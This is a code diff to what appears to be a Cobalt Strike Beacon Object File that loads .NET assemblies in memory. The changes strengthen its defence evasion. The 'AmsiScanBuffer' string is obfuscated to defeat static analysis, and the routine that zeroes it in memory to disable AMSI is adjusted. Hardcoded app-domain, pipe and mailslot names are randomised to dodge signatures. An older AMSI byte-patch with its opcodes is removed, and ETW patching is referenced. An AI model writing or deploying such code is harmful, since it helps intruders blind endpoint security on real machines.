@@ -213,6 +213,7 @@ BOOL patchETW(BOOL revertETW)
 WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess();
 WINBASEAPI void KERNEL32$GetSystemInfo(LPSYSTEM_INFO lpSystemInfo);
 WINBASEAPI SIZE_T KERNEL32$VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
+WINBASEAPI NTSTATUS NTAPI NTDLL$NtProtectVirtualMemory(HANDLE, PVOID, PULONG, ULONG, PULONG);
 
 static BOOL IsReadable(DWORD protect, DWORD state) 
 {
@@ -244,12 +245,14 @@ static BOOL search_mem(MEMORY_BASIC_INFORMATION* region, _NtProtectVirtualMemory
     for (int j = 0; j < region->RegionSize - sizeof(unsigned char*); j++) {
         unsigned char* current = ((unsigned char*)region->BaseAddress) + j;
 
-        //See if the current pointer points to "AmsiScanBuffer" 
-        char name[] = "AmsiScanBuffer"; //@@@ need to obscure for static analysis...
+        //See if the current pointer points to "AmsiScanBuffer", try to avoid static analysis
+		char target_name[] = "AnsiScamBaffer";
+		target_name[1] = 'm'; target_name[7] = 'n'; target_name[9] = 'u';
+		int target_len = 14; //MSVCRT$strlen(target_name);
         
         BOOL found = 1;
-        for (int k = 0; k < sizeof(name); k++) {
-            if (current[k] != name[k]) {
+        for (int k = 0; k < sizeof(target_name); k++) {
+            if (current[k] != target_name[k]) {
                 found = 0;
                 break;
             }
@@ -260,7 +263,7 @@ static BOOL search_mem(MEMORY_BASIC_INFORMATION* region, _NtProtectVirtualMemory
             DWORD original = 0;
             if ((region->Protect & PAGE_READWRITE) != PAGE_READWRITE) {
                 //VirtualProtect(region.BaseAddress, region.RegionSize, PAGE_EXECUTE_READWRITE, &original);
-                status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&region->BaseAddress, (PULONG)&region->RegionSize, PAGE_EXECUTE_READWRITE, &original);
+                status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&region->BaseAddress, (PULONG)&region->RegionSize, PAGE_READWRITE, &original);
 				if (status != STATUS_SUCCESS) {
 					BeaconPrintf(CALLBACK_ERROR , "[!] search_mem: NtProtectVirtualMemory failed\n");
 					continue;
@@ -268,7 +271,7 @@ static BOOL search_mem(MEMORY_BASIC_INFORMATION* region, _NtProtectVirtualMemory
             }
 
             //Overwrite the strings with zero. This will now be an "empty" string.
-            for (int m = 0; m < sizeof(name); m++) {
+            for (int m = 0; m < sizeof(target_name); m++) {
                 current[m] = 0;
             }
 
@@ -314,58 +317,6 @@ BOOL patchAMSI()
     return (count > 0);
 }
 
-
-
-/* old Patch AMSI 
-BOOL patchAMSI()
-{
-#ifdef _M_AMD64
-    unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; //x64
-#elif defined(_M_IX86)
-	unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }; //x86
-#endif
-
-	NTSTATUS status;
-	
-	HINSTANCE hinst = LoadLibrary("amsi.dll");
-    void* pAddress = (PVOID)GetProcAddress(hinst, "AmsiScanBuffer"); // @@@ Win11: Behavior:Win32/AMSI_Patch_T.B12
-	if(pAddress == NULL) {
-		BeaconPrintf(CALLBACK_ERROR , "[!] GetProcAddress failed\n");
-		return 0;
-	}
-
-
-	void* lpBaseAddress = pAddress;
-	ULONG OldProtection, NewProtection;
-	SIZE_T uSize = sizeof(amsiPatch);
-	
-	//Change memory protection via NTProtectVirtualMemory
-	_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
-	status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
-	if (status != STATUS_SUCCESS) {
-		BeaconPrintf(CALLBACK_ERROR , "[!] NtProtectVirtualMemory failed %d\n", status);
-		return 0;
-	}
-
-	//Patch AMSI via NTWriteVirtualMemory
-	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
-	status = NtWriteVirtualMemory(NtCurrentProcess(), pAddress, (PVOID)amsiPatch, sizeof(amsiPatch), NULL);
-	if (status != STATUS_SUCCESS) {
-		BeaconPrintf(CALLBACK_ERROR , "[!] NtWriteVirtualMemory failed\n");
-		return 0;
-	}
-
-	//Revert back memory protection via NTProtectVirtualMemory
-	status = NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);
-	if (status != STATUS_SUCCESS) {
-		BeaconPrintf(CALLBACK_ERROR , "[!] NtProtectVirtualMemory2 failed\n");
-		return 0;
-	}
-	
-	//Successfully patched AMSI
-	return 1;	
-}
-*/
 
 
 /*Start CLR*/
@@ -434,6 +385,32 @@ static BOOL consoleExists(void) {//https://www.devever.net/~hl/win32con
  return !!GetConsoleWindow();
 }
 
+#define TMPBUFLEN 64
+
+typedef BOOLEAN(WINAPI *RTLGENRANDOM)(PVOID, ULONG);
+
+void gen_rand_str(char *buffer, int offset, int length)
+{
+	unsigned char randomBytes[TMPBUFLEN];
+
+	RTLGENRANDOM pRtlGenRandom = (RTLGENRANDOM)GetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction036");
+	if (!pRtlGenRandom || !pRtlGenRandom(randomBytes, TMPBUFLEN))
+	{
+		BeaconPrintf(CALLBACK_ERROR, "[!] gen_rand_str: RtlGenRandom failed");
+		return;
+	}
+
+	int end = offset + length;
+	if (end > TMPBUFLEN) end = TMPBUFLEN;
+
+	for (int i = offset; i < end; i++)
+	{
+		unsigned char val = randomBytes[i] % 26;
+		buffer[i] = 'A' + val;
+	}
+	buffer[end] = '\0';
+}
+
 
 /*BOF Entry Point*/
 void go(IN PCHAR buffer, IN ULONG blength) 
@@ -449,9 +426,14 @@ void go(IN PCHAR buffer, IN ULONG blength)
 	//BeaconPrintf(CALLBACK_OUTPUT, "[+] assemblyArguments: %s\n", assemblyArguments);
 
 	// defaults
-	char* appDomain = "test";
-	char* pipeName = "test";
-	char* slotName = "test";
+	//char* appDomain = "test";
+	//char* pipeName = "test";
+	//char* slotName = "test";
+	char appDomain[TMPBUFLEN] = { 't', 'e', 's', 't', '-' };           gen_rand_str(appDomain, 5, 8);
+	char pipeName[TMPBUFLEN]  = { 's', 'v', 'c', 't', 's', 't', '.' }; gen_rand_str(pipeName, 7, 12);
+	char slotName[TMPBUFLEN]  = { 't', 's', 't', 's', 'l', 't', '-' }; gen_rand_str(slotName, 7, 8);
+	//BeaconPrintf(CALLBACK_OUTPUT, "[+] %s\n    %s\n    %s\n", appDomain, pipeName, slotName);
+	
 	BOOL amsi = 1;
 	BOOL etw = 1;
 	BOOL revertETW = 1;
